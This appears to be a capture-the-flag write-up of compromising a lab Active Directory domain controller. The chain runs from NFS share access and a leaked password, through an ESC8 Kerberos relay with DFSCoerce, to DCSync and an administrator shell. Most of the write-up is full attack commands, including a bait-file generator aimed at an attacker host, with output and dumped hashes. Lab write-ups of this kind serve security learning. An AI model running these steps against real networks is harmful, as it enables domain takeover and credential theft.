
![logo](Images/logo.png)

# Attack Chain

```
NFS anonymous access (/profiles)
  └─► userlist (profile names) + Rosie.Powell creds (post-it in marketing.png)
    └─► AD CS enum → ESC8 (HTTP Web Enrollment, NTLM disabled)
        └─► marshaled DNS record (CredMarshalTargetInfo) via bloodyAD
            └─► krbrelayx + DFSCoerce → Kerberos relay over SMB
                └─► certificate for DC-JPQ225$ (machine account)
                    └─► PKINIT (certipy auth) → TGT + NT hash of DC-JPQ225$
                        └─► DCSync → Administrator NT hash
                            └─► TGT as Administrator → evil-winrm (Kerberos) → DA
```

# Summary

- [Enumeration](#enumeration)
	- [nmap](#nmap)
	- [SMB](#smb)
- [NFS](#nfs)
	- [Mount the NFS Share](#mount-the-nfs-share)
	- [Rosie.Powell's password](#rosiepowells-password)
- [SMB Shares](#smb-shares)
- [AD CS template enumeration](#ad-cs-template-enumeration)
- [ESC8 exploitation - Kerberos relay over SMB](#esc8-exploitation---kerberos-relay-over-smb)
	- [Add DNS entry](#add-dns-entry)
	- [Relay the authentication](#relay-the-authentication)
	- [Authenticate with Certipy](#authenticate-with-certipy)
- [DCSync](#dcsync)
- [Shell as administrator](#shell-as-administrator)

---
# Enumeration

### nmap

Let's run an `nmap` scan on the target.

```
nmap -sVC 10.129.*.* -oA nmap

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-16 09:11:28Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-06-16T08:59:17
|_Not valid after:  2027-06-16T08:59:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-06-16T08:59:17
|_Not valid after:  2027-06-16T08:59:17
|_ssl-date: TLS randomness does not represent time
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-06-16T08:59:17
|_Not valid after:  2027-06-16T08:59:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-06-16T08:59:17
|_Not valid after:  2027-06-16T08:59:17
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-16T09:12:52+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-06-15T09:07:01
|_Not valid after:  2026-12-15T09:07:01
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-06-16T09:12:17
|_  start_date: N/A
```

> [!NOTE]
> **Observations**
> - FQDN : `DC-JPQ225.cicada.vl`
> - Domain : `cicada.vl`
> - Target is a Domain Controler
> - NFS is exposed

From our observations, we can add both entry to our `/etc/hosts` file.

```
echo '10.129.*.* DC-JPQ225.cicada.vl cicada.vl' | tee -a /etc/hosts

10.129.*.* DC-JPQ225.cicada.vl cicada.vl
```

### SMB

Next thing we can do is to see if null session are authorized.

```
nxc smb 10.129.*.* -u '' -p ''                              

SMB    10.129.*.*   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)

SMB    10.129.*.*   445    DC-JPQ225        [-] cicada.vl\: STATUS_NOT_SUPPORTED
```

They are not, but we got an important information. NTLM authentication is disabled on the target, which mean we can only authenticate ourself over **Kerberos**.

Knowing this, we can generate the `/etc/krb5.conf` file in order to resolve the KDC properly.

```
nxc smb 10.129.*.* -k --generate-krb5-file /etc/krb5.conf

SMB   10.129.*.*   445    DC-JPQ225        [+] krb5 conf saved to: /etc/krb5.conf
SMB   10.129.*.*   445    DC-JPQ225        [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
```

# NFS

One open port that looks promising is `2049`. It's a port that host nfs shares, being able to access it from outside could lead to important information being leaked.

Let's list the shares we can access.

```
showmount -e 10.129.*.*

Export list for 10.129.*.*:
/profiles (everyone)
```

### Mount the NFS Share

We can access `/profiles`, let's mount it on our machine.

```
mkdir -p /mnt/profiles
mount -t nfs -o vers=3 10.129.*.*:/profiles /mnt/profiles -o nolock
```

We can confirm the mount by navigating to the directory we created.

```
cd /mnt/profiles
ls

Administrator    Debra.Wright  Jordan.Francis  Katie.Ward     Richard.Gibbons  Shirley.West
Daniel.Marshall  Jane.Carter   Joyce.Andrews   Megan.Simpson  Rosie.Powell
```

We have a lot of directories. Their name are probably users of the domain so we can make a list from there in case we need it.

Let's inspect the directories.

```
tree -a
.
├── Administrator
│   ├── Documents
│   │   ├── $RECYCLE.BIN
│   │   │   └── desktop.ini
│   │   └── desktop.ini
│   └── vacation.png
├── Daniel.Marshall
├── Debra.Wright
├── Jane.Carter
├── Jordan.Francis
├── Joyce.Andrews
├── Katie.Ward
├── Megan.Simpson
├── Richard.Gibbons
├── Rosie.Powell
│   ├── Documents
│   │   ├── $RECYCLE.BIN
│   │   │   └── desktop.ini
│   │   └── desktop.ini
│   └── marketing.png
└── Shirley.West

16 directories, 6 files
```

We found 2 images, let's open them to see what they contains.
### Rosie.Powell's password

Opening `marketing.png` reveals the following :

![rosie's password](Images/rosie%27s%20password.png)

It's a classic situation where a person writes their password on a post-it.

The file was under `Rosie.Powell`, let's confirm if the password is valid for the user.

```
nxc smb 10.129.*.* -u Rosie.Powell -p 'Cicada123' -k
SMB     10.129.*.*   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)

SMB     10.129.*.*   445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
```


> [!TIP]
> **Credentials obtained**
> - User : `Rosie.Powell`
> - Password : `Cicada123`

# SMB Shares

Now that we have valid credentials, let's enumerate the shares.

```
nxc smb 10.129.*.* -u Rosie.Powell -p 'Cicada123' -k --shares

SMB     10.129.*.*   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB     10.129.*.*   445    DC-JPQ225      [+] cicada.vl\Rosie.Powell:Cicada123

SMB     10.129.*.*   445    DC-JPQ225      [*] Enumerated shares
SMB     10.129.*.*   445    DC-JPQ225      Share      Permissions     Remark
SMB     10.129.*.*   445    DC-JPQ225     -----       -----------     ------

SMB     10.129.*.*   445    DC-JPQ225     ADMIN$                 Remote Admin

SMB     10.129.*.*   445    DC-JPQ225     C$                              Default share

SMB     10.129.*.*   445    DC-JPQ225     CertEnroll      READ            Active Directory Certificate Services share

SMB     10.129.*.*   445    DC-JPQ225     IPC$            READ            Remote IPC

SMB     10.129.*.*   445    DC-JPQ225     NETLOGON        READ            Logon server share

SMB     10.129.*.*   445    DC-JPQ225     profiles$       READ,WRITE

SMB     10.129.*.*   445    DC-JPQ225     SYSVOL          READ            Logon server share
```

There are 2 uncommon shares,  `CertEnroll` where we have `READ`right, and `profiles$` where we have `READ` and `WRITE`.

After a quick look `profiles$` is just a copy of the NFS share with the same name.

Since we have `WRITE` access to it, I tried to put malicious files inside the directories of every user present on the share, created with `ntlm_theft.py` to capture their NetNTLMv2 or relay their authentication. 

```
ntlm_theft.py --verbose --generate modern --server "10.10.*.*" --filename /workspace/Meeting/hacked
```

But since there is no script on the target running to simulate a user behavior, it was a failure.

The other share `CertEnroll` however, point to the fact that AD CS might be in place on the Domain Controller. First let's get a TGT to authenticate with **Kerberos**.

```
getTGT.py -dc-ip "10.129.*.*" "cicada.vl"/"Rosie.Powell":"Cicada123"
Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Rosie.Powell.ccache
```

# AD CS template enumeration

Now that we have a valid TGT, we can enumerate the AD CS templates on the server and search for vulnerabilities.

```
export KRB5CCNAME=Rosie.Powell.ccache
```

```
certipy find -enabled -u "Rosie.Powell@cicada.vl" -p "Cicada123" -k -vulnerable -stdout -target DC-JPQ225.cicada.vl

 CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 7F8B74C7577D7EAD45EFA8B92C4E23D9
    Certificate Validity Start          : 2026-06-16 09:03:04+00:00
    Certificate Validity End            : 2526-06-16 09:13:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
```

We have a template that is vulnerable to **ESC8** because the Web Enrollment is enabled over HTTP.

But since NTLM authentication is disabled on the target, we can't use the classic method with `ntlmrelayx`. So we have to find a way around.

# ESC8 exploitation - Kerberos relay over SMB

A google research, `esc8 exploit kerberos`, lead us to this [article](https://www.thehacker.recipes/ad/movement/kerberos/relay) on **The Hacker Recipe** explaining how to perform a Kerberos relay to bypass the necessity of NTLM, which is our case here.
The article mention the original article, along the article on [synactive](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) that explain the vulnerability deeper.

> [!NOTE]
> **Explanation**
> When an SMB client builds the SPN from the service class and its name, the `SecMakeSPNEx2` method is called, which calls the `CredMarshalTargetInfo` API function. 
>
> This API takes a list of target information in a `CREDENTIAL_TARGET_INFORMATION` structure, _marshalizes_ it in Base64, and appends it to the end of the actual SPN.
> For the hostname `target` and the class of service `cifs`, the returned SPN will look like :
> `cifs/target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA`.
>
> So, if we register the DNS record `target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA`, the client will be able to request a ticket for `cifs/target`, but will connect to `DC-JPQ225.cicada.vl1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA`.

### Add DNS entry

First of all, we need to register the specific DNS record (the NetBIOS being that of **the machine which is going to receive the relay**, for example the PKI, and not the one which will be coerced).

```
bloodyAD --host DC-JPQ225.cicada.vl -d cicada.vl -u Rosie.Powell -p 'Cicada123' -k add dnsRecord "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" 10.10.*.*

[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

### Relay the authentication

Next we need to start our Kerberos relay.

```
krbrelayx.py -t 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'
```

The template `DomainController` is chosen here because the coerced object is the DC machine account.

`PetitPotam` fails here because of  `invalid_checksum` on lsarpc in Kerberos. So we must use `dfscoerce.py` to make the coercion.

```
dfscoerce.py "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -d cicada.vl -no-pass -k -dc-ip 10.129.*.*
```

Let's check our relay to see if it worked.

```
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80

[*] Setting up DNS Server
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.*.*
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.*.*
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] Skipping user DC-JPQ225$ since attack was already performed
[*] GOT CERTIFICATE! ID 88
[*] Writing PKCS#12 certificate to ./DC-JPQ225.pfx
[*] Certificate successfully written to file
```

it worked !
We got a certificate for the DC machine account. All is left now is to authenticate and retrieve its TGT.

### Authenticate with Certipy

Let's use `certipy` to authenticate with the certificate.

```
certipy auth -pfx DC-JPQ225.pfx -dc-ip 10.129.*.*

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

We got a TGT for `DC-JPQ225$`. Let's export it.

```
export KRB5CCNAME=dc-jpq225.ccache
```

# DCSync

Now that we have a TGT for the DC machine account, we can perform a DCSync attack to retrieve every hashes of the domain along its secrets.

```
secretsdump -k "DC-JPQ225.cicada.vl"                                               Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::

<SNIP>

[*] Cleaning up...
```

# Shell as administrator

Since we have now the hash of `administrator`, we can request a TGT.

```
getTGT.py -dc-ip "10.129.*.*" "cicada.vl"/"administrator" -hashes :85a0da53871a9d56b6cd05deda3a5e87
Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in administrator.ccache
```

And we can connect over winrm.

```
export KRB5CCNAME=administrator.ccache
```

```bash
evil-winrm -i DC-JPQ225.cicada.vl -r cicada.vl

*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\dc-jpq225\profiles$\Administrator\Documents>
```


> [!TIP]
> **Machine rooted !**
> Both flags can be found under `Administrator`'s Desktop.